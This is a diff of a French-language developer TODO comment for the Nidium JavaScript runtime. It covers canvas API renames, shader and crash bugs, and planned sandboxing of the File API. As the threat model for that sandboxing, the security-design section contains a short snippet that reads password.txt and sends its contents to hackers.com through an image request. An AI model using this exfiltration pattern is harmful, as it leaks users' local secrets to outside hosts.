@@ -9,44 +9,67 @@
 ------
 TODO :
 ------
-	URGENT :
-	- internal file relative to app : no!
-	- nml : <viewport>1024x768</viewport>
 
+	- reveil à 9H00
+	- ready to work à 10H
+	- 10H -> 19H
+	- 19H detente, resto
+	- after : selon humeur et fatigue
 
-	Session Catel :
-	- NML basics + include
-	- outline
-	- scale
+	STREAM API :
+		- finir l'api stream
 
+	SECURITY DESIGN :
+		- créer base de donnée local
+		- dedans, créer une clé de config nommée localFileAccess : "/shared/"
+		- restraindre API File dans un dossier
+
+		- les appels à File.read("config.bin") --> dist/shared/config.bin
+		- Nidium Malicious Bacon Attack :
+			var m = File.read("password.txt", function(e){
+				var i = new Image();
+				t.src = "http://www.hackers.com/content="+URLencode(e.data);
+			});
+	
 	CANVAS :
-	- measureText.width
-	- renommer ctx.fontType en ctx.fontFamily
-	- renommer Native.canvas en window.canvas (main canvas)
+		- import des fontes
+		- renommer ctx.fontType en ctx.fontFamily
+		- renommer Native.canvas en window.canvas (main canvas)
+		- renommer ctx en context (pas d'abbreviation dans l'api, ça fait amateur)
 
-	- renommer ctx en context (pas d'abbreviation dans l'api, ça fait amateur)
-	- requestAnimationFrame a enlever du context
-	- rester compliant avec plutot window.requestAnimationFrame = function(){};
+	COMPLIANCY :
+		- measureText.width
+		- window.requestAnimationFrame = function(){};
+		- corriger textAlign vertical (center)
 
 	SHADER :
-	- shader ne suit pas le coin haut gauche du layer
-
-	DEMO VIDEO :
-	- shader non relatif au layer
+		- shader ne suit pas le coin haut gauche du layer
 
 	CRASH :
-	- thread crash
-	- showFPS crash
+		- thread crash
+		- showFPS(true) crash au refresh
 
-	DIVERS
-	- nss can not be empty and must have minimum {} in it
+	STRAIGHTFORWAD
+		- subtlepatterns.com (contacter et rajouter crédit)
 
-	- subtlepatterns.com (contacter et rajouter crédit)
-	- window.resize
+	COMPLEXE
+		- Gestion du cache
+		- nml : <viewport>1024x768</viewport>
+		- API Worker + rajouter console+include (voir ça https://github.com/astro/bitford/blob/master/src/sha1-worker.js)
+		- NML basics + include
+		- outline
+		- scale
+		- nss can not be empty and must have minimum {} in it
+		- window.resize
+
+	STEALTH INVISIBLE MODE :
+		- 512Mo Ramdisk
+		- Cleanup Destruction on quit
 
 ------
 DONE :
 ------
+	- Image() et File() file relative to nml : (DONE)
 	- document.location.href = "fdsf/view.nml"; (DONE)
 	- contextmenu window.mouseX, window.mouseY (DONE)
 	- radial gradient : fail (DONE)
@@ -56,6 +79,7 @@ DONE :
 */
 
 document.background = "#272822";
+load("sample.js");
 
 //load("applications/_tests/timers.js");
 //load("applications/_tests/arc.js");
